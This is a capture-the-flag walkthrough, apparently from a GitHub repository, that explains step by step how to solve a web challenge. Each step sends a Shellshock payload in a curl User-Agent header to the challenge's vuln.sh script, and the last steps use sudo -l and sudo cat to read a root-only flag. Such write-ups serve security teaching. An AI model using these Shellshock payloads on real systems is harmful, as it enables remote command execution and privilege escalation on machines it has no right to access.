# Escalation

- **Category**: Web  
- **Appearance conditions**: after solving Challenge `2014-6271`.  
- **Solution**: privilege escalation via improper sudo configuration.  

---

| Step | Screenshot |
|------|------------|
|1. Open the challenge and see the message *Do you find rootflag?*|<img width="505" height="241" alt="image" src="https://github.com/user-attachments/assets/fa0c75a4-4f1d-4ea6-b371-18752414068e" />|
|2. Try searching for *rootflag* on the server using the following command.<br>`curl -A "(){ :;}; /usr/bin/find / -type f -name *rootflag* 2>/dev/null " -b "your_session_cookie" https://nctf.xvps.jp/ntsettings/vuln.sh`<br>This reveals the *rootflag* file.|<img width="826" height="358" alt="image" src="https://github.com/user-attachments/assets/d9f4c694-d18d-4d2a-abd2-3e7a8f172c48" />|
|3. Next, check the file permission with the following command.<br>```curl -A "(){ :;}; /usr/bin/ls -la /tmp/hidden/access_denied/busted/rootflag.txt" -b "your_session_cookie" https://nctf.xvps.jp/ntsettings/vuln.sh```<br>The result shows you need root permission to read this file.|<img width="1895" height="763" alt="image" src="https://github.com/user-attachments/assets/e9e9d7a6-2c44-42ae-a869-d6566b09c6c7" />|
|4. First, check the current login user using the `id` command:<br>`curl -A "(){ :; }; /usr/bin/id " -b "your_session_cookie" https://nctf.xvps.jp/ntsettings/vuln.sh`<br>The result shows the user is **www-data**, which is a low-privileged account.<br><br>How can we get root permission?<br>Although there are many ways to escalate privileges, this time we investigate [sudo](https://linuc.org/study/column/4047/), since it is often the easiest method.|<img width="1891" height="759" alt="image" src="https://github.com/user-attachments/assets/e58f59d2-8c09-4b32-a4fa-2bbbf53796ba" />|
|5. Run the `sudo -l` command. The `-l` option shows which programs can be run with root privileges by the current user.<br>The output shows `/usr/bin/cat` is allowed.<br>```curl -A "(){ :; }; /usr/bin/sudo -l " -b "session=your_cookie" https://nctf.xvps.jp/ntsettings/vuln.sh```|<img width="1902" height="930" alt="image" src="https://github.com/user-attachments/assets/78edc13f-faeb-4a3d-b99a-6db2938fca5d" />|
|6. Finally, read the *rootflag* file using `cat` with `sudo`.<br>`curl -A "(){ :; }; /usr/bin/sudo /usr/bin/cat /tmp/hidden/access_denied/busted/rootflag.txt" -b "session=your_cookie" https://nctf.xvps.jp/ntsettings/vuln.sh`<br><br>🎊 Congratulations! You got the flag.|<img width="1891" height="747" alt="image" src="https://github.com/user-attachments/assets/7a766897-cb3c-4fd1-ba7b-d2d3247e8d67" />|
